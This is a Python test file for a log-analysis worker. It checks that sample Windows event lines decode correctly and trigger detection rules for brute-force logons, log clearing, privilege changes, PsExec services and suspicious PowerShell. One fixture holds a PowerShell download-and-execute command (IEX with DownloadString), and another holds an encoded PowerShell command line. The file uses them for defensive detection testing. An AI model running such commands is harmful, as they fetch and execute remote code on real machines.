# tests/worker/test_windows_decoding.py
"""Windows agent lines (agent/internal/winevent.FormatXML) through the shipped decoders and rules."""
import asyncio
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest

from worker.decoder_engine import DecoderEngine
from worker.sigma_engine import SigmaEngine

ROOT = os.path.join(os.path.dirname(__file__), "../..")

# Exact output of FormatXML for a 4625 (see tests/agent/winevent_format_test.go).
LOGON_FAILED = (
    'EventID=4625 Channel="Security" Provider="Microsoft-Windows-Security-Auditing" Computer="WIN01.corp.local" '
    'RecordID="98765" Level="0" Task="12544" Opcode="0" Keywords="0x8010000000000000" '
    'TimeCreated="2026-10-18T03:00:00.1234567Z" ProcessID="672" IpAddress="203.0.113.7" IpPort="51234" '
    'LogonType="3" SubjectUserSid="S-1-0-0" TargetDomainName="CORP" TargetUserName="administrator" WorkstationName="KALI"'
)


def _load(pattern):
    return [open(p).read() for p in sorted(glob.glob(os.path.join(ROOT, pattern)))]


@pytest.fixture(scope="module")
def engines():
    import yaml
    decoders = sorted(_load("decoders/*.yaml"), key=lambda c: yaml.safe_load(c).get("priority", 100))
    dec = DecoderEngine()
    dec.load_from_yaml_list(decoders)
    sig = SigmaEngine()
    sig.load_from_yaml_list(_load("rules/*.yaml"))
    assert not sig.load_errors, sig.load_errors
    return dec, sig


def _run(engines, log_type, line):
    dec, sig = engines
    event, name = dec.decode_named(log_type, line)
    titles = [m["title"] for m in asyncio.run(sig.evaluate(dict(event, raw_message=line)))]
    return event, name, titles


def test_logon_failure_decodes_ahead_of_legacy_regex(engines):
    event, name, _ = _run(engines, "windows_security", LOGON_FAILED)
    assert name == "win_security_4625_logon_failed"
    assert event["event.action"] == "login_failed" and event["event.category"] == "authentication"
    assert (event["user.name"], event["source.ip"], event["host.hostname"]) == \
        ("administrator", "203.0.113.7", "WIN01.corp.local")
    assert event["winlog.event_id"] == "4625" and event["winlog.logon.type"] == "3"


def test_logon_failures_trip_windows_brute_force(engines):
    titles = []
    for _ in range(5):
        titles += _run(engines, "windows_security", LOGON_FAILED)[2]
    assert any(t.startswith("Windows Logon Brute Force") for t in titles), titles


@pytest.mark.parametrize("log_type,line,decoder,title", [
    ("windows_security",
     'EventID=1102 Channel="Security" Provider="Microsoft-Windows-Eventlog" Computer="WIN01" '
     'SubjectDomainName="CORP" SubjectUserName="bob" SubjectUserSid="S-1-5-21-1-1001"',
     "win_security_1102_log_cleared", "Windows Event Log Cleared"),
    ("windows_security",
     'EventID=4732 Channel="Security" Computer="WIN01" MemberSid="S-1-5-21-1-1002" SubjectUserName="bob" '
     'TargetDomainName="Builtin" TargetUserName="Administrators"',
     "win_security_4732_group_member_added", "User Added to Windows Administrators Group"),
    ("windows_security",
     'EventID=4720 Channel="Security" Computer="WIN01" SubjectUserName="bob" TargetUserName="backdoor"',
     "win_security_4720_user_created", "Windows Local or Domain User Created"),
    ("windows_security",
     'EventID=4698 Channel="Security" Computer="WIN01" SubjectUserName="bob" TaskName="\\Updater"',
     "win_security_4698_scheduled_task_created", "Windows Scheduled Task Created"),
    ("windows_system",
     'EventID=7045 Channel="System" Provider="Service Control Manager" Computer="WIN01" '
     'AccountName="LocalSystem" ImagePath="%SystemRoot%\\PSEXESVC.exe" ServiceName="PSEXESVC" StartType="demand start"',
     "win_system_7045_service_installed", "New Windows Service Installed"),
    ("windows_powershell",
     'EventID=4104 Channel="Microsoft-Windows-PowerShell/Operational" Computer="WIN01" '
     'ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString(\'http://x/a\')"',
     "win_powershell_4104_script_block", "Suspicious PowerShell Script Block"),
])
def test_windows_events_decode_and_alert(engines, log_type, line, decoder, title):
    _, name, titles = _run(engines, log_type, line)
    assert name == decoder
    assert title in titles, titles


def test_benign_events_do_not_alert(engines):
    _, name, titles = _run(engines, "windows_security",
                           'EventID=4732 Channel="Security" Computer="WIN01" TargetUserName="Remote Desktop Users"')
    assert name == "win_security_4732_group_member_added"
    assert "User Added to Windows Administrators Group" not in titles
    _, _, titles = _run(engines, "windows_powershell",
                        'EventID=4104 Channel="Microsoft-Windows-PowerShell/Operational" ScriptBlockText="Get-ChildItem C:\\"')
    assert "Suspicious PowerShell Script Block" not in titles


def test_sysmon_process_keeps_sigma_native_fields(engines):
    line = ('EventID=1 Channel="Microsoft-Windows-Sysmon/Operational" Computer="WIN01" '
            'CommandLine="powershell.exe -enc SQBFAFgA" Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
            'ParentImage="C:\\Windows\\explorer.exe" User="CORP\\bob"')
    event, name, _ = _run(engines, "windows_sysmon", line)
    assert name == "win_sysmon_1_process_created"
    assert event["CommandLine"] == "powershell.exe -enc SQBFAFgA"
    assert event["Image"].endswith("powershell.exe") and event["process.parent.name"] == "C:\\Windows\\explorer.exe"


def test_unknown_event_ids_fall_back_to_generic(engines):
    for log_type, decoder in (("windows_security", "win_security_generic"), ("windows_system", "win_system_generic"),
                              ("windows_sysmon", "win_sysmon_generic"), ("windows_application", "win_application_generic")):
        event, name, _ = _run(engines, log_type, 'EventID=9999 Channel="X" Computer="WIN01"')
        assert name == decoder and event["winlog.event_id"] == "9999"
